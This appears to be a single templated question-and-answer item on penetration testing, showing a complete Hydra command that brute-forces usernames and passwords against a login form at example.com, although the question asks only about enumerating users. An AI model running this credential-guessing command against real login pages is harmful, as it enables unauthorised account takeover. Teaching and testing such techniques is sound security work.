TECHNIQUE / QUESTION:
How can you enumerate users for a suspected login brute-force attack?

CONTEXT:
The application has a login form at http://example.com/login.

METHOD / ANSWER:
Command: `hydra -L users.txt -P passwords.txt http-post-form "http://example.com/login:username=^USER^&password=^PASS^:F=incorrect password"`
Explanation: This command uses Hydra to test a list of usernames and passwords against the login form to identify valid credentials.
